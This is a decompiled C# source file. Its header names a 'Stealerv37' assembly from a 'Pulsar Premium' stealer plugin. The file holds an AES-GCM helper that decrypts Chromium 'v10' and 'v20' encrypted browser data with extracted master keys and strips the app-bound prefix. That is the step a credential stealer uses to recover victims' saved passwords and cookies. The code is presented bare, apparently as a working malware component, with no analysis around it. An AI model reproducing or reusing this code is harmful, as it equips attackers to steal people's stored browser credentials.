// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.Encrypted.AesGcm
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;
using System.Text;

#nullable disable
namespace Intelix.Helper.Encrypted;

public static class AesGcm
{
  private const int MacBitSize = 128 /*0x80*/;
  private const int NonceBitSize = 96 /*0x60*/;
  private const int TagBytes = 16 /*0x10*/;
  private const int NonceBytes = 12;
  private const int HeaderBytes = 3;

  public static byte[] DecryptBrowser(
    byte[] encryptedData,
    byte[] masterKey10,
    byte[] masterKey20,
    bool checkprefix)
  {
    if (encryptedData.Length < 31 /*0x1F*/)
      return (byte[]) null;
    string str = Encoding.ASCII.GetString(encryptedData, 0, 3);
    byte[] numArray1 = new byte[12];
    Buffer.BlockCopy((Array) encryptedData, 3, (Array) numArray1, 0, 12);
    int srcOffset = 15;
    int count = encryptedData.Length - srcOffset - 16 /*0x10*/;
    if (count < 0)
      return (byte[]) null;
    byte[] numArray2 = new byte[count];
    if (count > 0)
      Buffer.BlockCopy((Array) encryptedData, srcOffset, (Array) numArray2, 0, count);
    byte[] numArray3 = new byte[16 /*0x10*/];
    Buffer.BlockCopy((Array) encryptedData, encryptedData.Length - 16 /*0x10*/, (Array) numArray3, 0, 16 /*0x10*/);
    byte[] numArray4;
    switch (str)
    {
      case "v20":
        numArray4 = masterKey20;
        break;
      case "v10":
        numArray4 = masterKey10;
        break;
      default:
        numArray4 = (byte[]) null;
        break;
    }
    byte[] key = numArray4;
    if (key == null)
      return (byte[]) null;
    byte[] numArray5 = AesGcm256.Decrypt(key, numArray1, (byte[]) null, numArray2, numArray3);
    if (numArray5 == null)
      return (byte[]) null;
    if (checkprefix && AesGcm.HasPrefix(numArray5) && numArray5.Length > 32 /*0x20*/)
    {
      int num1 = 0;
      for (int index = 0; index < 32 /*0x20*/; ++index)
      {
        byte num2 = numArray5[index];
        if (num2 >= (byte) 32 /*0x20*/ && num2 <= (byte) 126)
          ++num1;
        if (num1 > 2)
          break;
      }
      if (num1 > 2)
      {
        if (numArray5.Length <= 32 /*0x20*/)
          return new byte[0];
        byte[] destinationArray = new byte[numArray5.Length - 32 /*0x20*/];
        Array.Copy((Array) numArray5, 32 /*0x20*/, (Array) destinationArray, 0, destinationArray.Length);
        return destinationArray;
      }
    }
    return numArray5;
  }

  private static bool HasPrefix(byte[] plainText)
  {
    if (plainText.Length < 32 /*0x20*/)
      return false;
    int num = 0;
    for (int index = 0; index < 32 /*0x20*/; ++index)
    {
      if (plainText[index] >= (byte) 32 /*0x20*/ && plainText[index] <= (byte) 126)
        ++num;
    }
    return num > 2;
  }
}
